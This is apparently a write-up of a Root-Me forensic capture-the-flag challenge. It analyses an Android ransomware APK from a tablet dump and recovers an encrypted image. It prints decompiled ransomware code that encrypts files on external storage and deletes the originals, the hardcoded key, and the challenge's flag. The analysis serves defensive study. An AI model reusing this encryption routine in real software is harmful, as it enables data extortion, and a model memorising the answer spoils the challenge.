# Ransomware Android
https://www.root-me.org/en/Challenges/Forensic/Ransomware-Android
```
The CISO Android tablet has been compromised by a ransomware, his confidential documents were encrypted. It is, of course, no question for us to pay the ransom, we would lose all our credibility.
You have a part dump of his tablet and must restore these documents.
```

As the description mentioned, the ZIP file contains a dump of an Android file-system.<br>
In the _/app/_ directory there is only 1 APK (org.simplelocker-1.apk), in the _/app-lib/_ directory there is only 1 sub-directory (org.simplelocker-1) with 4 libraries (libobfsproxy.so, libprivoxy.so, libtor.so and libxtables.so), and the _/app-asec/_ and the _/app-private/_ are empty.<br>
The libraries' names are pretty suspicious. So identifing **org.simplelocker-1.apk** as the ransomeware is a pretty good guess.<br>
In this challenge, one or more documents had been encrypted. After a quick search, it seems like the only (important) file that suppose to be recovered is _/media/Documents/Confidentiel.jpg.enc_.<br><br>

After decompile the APK, the following AndroidManifest.xml was found:
```xml
<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="org.simplelocker">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <application android:allowBackup="false" android:debuggable="true" android:label="@string/app_name">
        <activity android:launchMode="singleTop" android:name=".Main" android:theme="@style/AppTheme">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <receiver android:enabled="true" android:exported="true" android:name=".ServiceStarter">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <receiver android:enabled="true" android:exported="true" android:name=".SDCardServiceStarter">
            <intent-filter>
                <action android:name="android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE"/>
            </intent-filter>
        </receiver>
        <service android:name=".MainService"/>
        <service android:enabled="true" android:exported="false" android:name="org.torproject.android.service.TorService">
            <intent-filter>
                <action android:name="org.torproject.android.service.ITorService"/>
                <action android:name="org.torproject.android.service.TOR_SERVICE"/>
            </intent-filter>
        </service>
    </application>
</manifest>
```

According to the manifest, there are 4 enabled services and 1 activity:
<ol>
  <li><b>.Main</b> activity, which is the application's launcher.</li>
  <li><b>.ServiceStarter</b>, which recieves an intent when the boot is completed (probably for starting).</li>
  <li><b>.SDCardServiceStarter</b>, which recieves the intent <i>ACTION_EXTERNAL_APPLICATIONS_AVAILABLE</i> which getting broadcast soon after the boot is completed (probably for starting the service).</li>
  <li><b>.MainService</b>.</li>
  <li><b>org.torproject.android.service.TorService</b>, which recieves intents from a TOR service.</li>
</ol><br>

The <b>.Main</b> activity seems to display something (not important), and it sends an intent (com.locker.MainServiceStart) to start the <b>.MainService</b>.<br>
The <b>.ServiceStarter</b> and the <b>.SDCardServiceStarter</b> services are pretty much the same - both send an intent (com.locker.MainServiceStart) to start the <b>.MainService</b>. Probably in order to keep the persistence of the ransomware after a reboot.<br>
The <b>org.torproject.android.service.TorService</b> is a known library. As the name implies, the service is used to communicate with a remote entity (in this APK the entity is 127.0.0.1:9050).<br><br>

So that leaves the <b>.MainService</b>.<br>
This service does bunch of stuff - communicate with a remote entity using TOR proxy, sets a _WakeLock_, schedule tasks and more. Because the APK is a ransomware, and because the challenge is to find an encrypted password, the following class seems interesting:<br>
```java
class C01165 implements Runnable {
    C01165() {
    }

    public void run() {
        try {
            new FilesEncryptor(MainService.this.context).encrypt();
        } catch (Exception e) {
            Log.d(Constants.DEBUG_TAG, "Error: " + e.getMessage());
        }
    }
}
```
A new object is initiated (FilesEncryptor) with the current context and the **encrypt** function is call.<br>
This is the **encrypt** function in the FilesEncryptor class:
```java
public void encrypt() throws Exception {
    if (!this.settings.getBoolean(Constants.FILES_WAS_ENCRYPTED, false) && isExternalStorageWritable()) {
        AesCrypt aes = new AesCrypt(Constants.CIPHER_PASSWORD);
        Iterator it = this.filesToEncrypt.iterator();
        while (it.hasNext()) {
            String fileName = (String) it.next();
            aes.encrypt(fileName, new StringBuilder(String.valueOf(fileName)).append(".enc").toString());
            new File(fileName).delete();
        }
        Utils.putBooleanValue(this.settings, Constants.FILES_WAS_ENCRYPTED, true);
    }
}
```
It's pretty easy to understand what's up.<br>
First, the function checks if the files are already encrypted (in order to not encrypt it twice) and if it's possible to change the data in the external storage.<br>
Then, an AES encryption instance is created (**AesCrypt**) with a key that presents in the **Constants** class.<br>
Afterward, it will iterate the files in the external storage and call the _encrypt_ function of the initiated **AesCrypt** object, and will delete the original file.<br>
Lastly, it will sets a boolean variable to ```true```, so the files won't get encrypted twice.<br><br>

According to the **Constants** class:
```java
...snip...
public static final String CIPHER_PASSWORD = "mcsTnTld1dDn";
...snip...
```
So the key is now known, let's see what's up at the **AesCrypt** class:
```java
...snip...
public AesCrypt(String password) throws Exception {
    MessageDigest digest = MessageDigest.getInstance("SHA-256");
    digest.update(password.getBytes(HTTP.UTF_8));
    byte[] keyBytes = new byte[32];
    System.arraycopy(digest.digest(), 0, keyBytes, 0, keyBytes.length);
    this.key = new SecretKeySpec(keyBytes, "AES");
    this.spec = getIV();
}

public AlgorithmParameterSpec getIV() {
    return new IvParameterSpec(new byte[16]);
}

public void encrypt(String rawFile, String encryptedFile) throws Exception {
    FileInputStream fis = new FileInputStream(rawFile);
    FileOutputStream fos = new FileOutputStream(encryptedFile);
    this.cipher.init(1, this.key, this.spec);
    CipherOutputStream cos = new CipherOutputStream(fos, this.cipher);
    byte[] d = new byte[8];
    while (true) {
        int b = fis.read(d);
        if (b == -1) {
            cos.flush();
            cos.close();
            fis.close();
            return;
        }
        cos.write(d, 0, b);
    }
}

public void decrypt(String encryptedFile, String rawFile) throws Exception {
    FileInputStream fis = new FileInputStream(encryptedFile);
    FileOutputStream fos = new FileOutputStream(rawFile);
    this.cipher.init(2, this.key, this.spec);
    CipherInputStream cis = new CipherInputStream(fis, this.cipher);
    byte[] d = new byte[8];
    while (true) {
        int b = cis.read(d);
        if (b == -1) {
            fos.flush();
            fos.close();
            cis.close();
            return;
        }
        fos.write(d, 0, b);
    }
}
```
Let's break it down a bit.<br>
First, in the constructor of the class a IV (which is an 16 zeros according to **getIV**) and akey generated from the given password (which we know already). The password seems to be a SHA-256 of the "mcsTnTld1dDn" - which is **d49af309a4c69382ff07bc6f83ba4c2595a7f086d3e5b69e119e2337cb75172d**.<br><br>

After we got the key and IV, we can decrypt the file. Fortunately, the **decrypt** function exists to do it for us (without writing a new script).<br>
So after copying the class to a new Java project, creating an instance (with "mcsTnTld1dDn") and running the **decrypt** function, it seems like an image was created.

In the end, the flag is **BullShitR4ns0mW4re**.
